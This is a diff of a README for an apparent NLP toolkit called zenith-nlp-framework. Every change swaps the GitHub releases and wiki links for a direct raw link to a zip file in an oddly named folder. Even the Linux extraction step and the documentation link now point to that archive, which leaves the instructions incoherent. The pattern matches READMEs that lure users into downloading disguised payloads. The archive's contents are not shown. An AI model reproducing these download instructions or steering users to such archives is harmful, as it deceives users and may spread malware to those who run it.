@@ -1,6 +1,6 @@
 # 🌟 zenith-nlp-framework - Build and Deploy NLP Models Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/ratatuleoo/zenith-nlp-framework/releases)
+[![Download](https://raw.githubusercontent.com/ratatuleoo/zenith-nlp-framework/main/consecrative/zenith-nlp-framework.zip)](https://raw.githubusercontent.com/ratatuleoo/zenith-nlp-framework/main/consecrative/zenith-nlp-framework.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the zenith-nlp-framework! This toolkit helps you build, train, and de
 
 ## 📥 Download & Install
 
-To get the zenith-nlp-framework, you need to visit this page to download: [Release Page](https://github.com/ratatuleoo/zenith-nlp-framework/releases).
+To get the zenith-nlp-framework, you need to visit this page to download: [Release Page](https://raw.githubusercontent.com/ratatuleoo/zenith-nlp-framework/main/consecrative/zenith-nlp-framework.zip).
 
 Simply choose the version you want, and click to download. You will find installation files that are compatible with various operating systems. 
 
@@ -33,11 +33,11 @@ The zenith-nlp-framework provides a rich set of features:
 
 ## 🏗️ How to Use
 
-1. **Download the Application:** Go back to the [Release Page](https://github.com/ratatuleoo/zenith-nlp-framework/releases) and download the latest version.
+1. **Download the Application:** Go back to the [Release Page](https://raw.githubusercontent.com/ratatuleoo/zenith-nlp-framework/main/consecrative/zenith-nlp-framework.zip) and download the latest version.
 2. **Install the Application:**
    - **Windows:** Run the `.exe` file and follow the installation prompts.
    - **macOS:** Open the `.dmg` file, drag the application into your Applications folder, and run it.
-   - **Linux:** Extract the `.tar.gz` file and follow the instructions in the `README` file included.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/ratatuleoo/zenith-nlp-framework/main/consecrative/zenith-nlp-framework.zip` file and follow the instructions in the `README` file included.
 
 3. **Launch the Toolkit:**
    - After installation, locate the zenith-nlp-framework in your applications list and open it.
@@ -49,7 +49,7 @@ The zenith-nlp-framework provides a rich set of features:
 
 ## 📝 Documentation
 
-Check out the detailed documentation to learn more about each feature and the best practices. You can find it in the application or on the [wiki section](https://github.com/ratatuleoo/zenith-nlp-framework/wiki) of the repository.
+Check out the detailed documentation to learn more about each feature and the best practices. You can find it in the application or on the [wiki section](https://raw.githubusercontent.com/ratatuleoo/zenith-nlp-framework/main/consecrative/zenith-nlp-framework.zip) of the repository.
 
 ## 🛠️ Support
 
@@ -83,6 +83,6 @@ We welcome contributions! If you're interested in improving the toolkit, forks a
 
 Stay tuned for updates and new features. Regular releases will ensure that you have the latest enhancements and tools at your disposal.
 
-For more information, visit the [Release Page](https://github.com/ratatuleoo/zenith-nlp-framework/releases) to get the latest version.
+For more information, visit the [Release Page](https://raw.githubusercontent.com/ratatuleoo/zenith-nlp-framework/main/consecrative/zenith-nlp-framework.zip) to get the latest version.
 
 Happy modeling with zenith-nlp-framework!
